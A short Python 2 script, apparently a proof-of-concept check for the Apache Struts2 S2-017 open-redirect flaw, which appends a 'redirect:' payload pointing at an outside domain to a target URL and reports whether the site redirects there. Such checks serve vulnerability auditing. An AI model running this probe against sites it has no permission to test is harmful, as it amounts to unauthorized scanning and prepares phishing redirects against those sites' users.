#coding=utf-8
import sys
import requests
def scan(target):
    info = {
    'name':u'Struts2-017 POC',
    'date':'2014-12-5',
    'author':'Lenka',
    'poc':'?redirect:http://vul.jdsec.com/'
    }
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    audit_request = requests.get(target + info['poc'],headers=headers)
    audit_request.close()
    if audit_request.status_code == 200:
        if audit_request.url == u'http://vul.jdsec.com/':
            print u'[!]audit success'
            print '[*]' + target + info['poc']
        else:
            print u'[!]audit error'
    else:
        print 'connection error'
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "Usage: python struts2_poc_017.py [target]\n"
        print "Example: python python struts2_poc_017.py  http://www.xxx.com/xxx.action\n"
        sys.exit(1)
    else:
        target = sys.argv[1]
    scan(target)
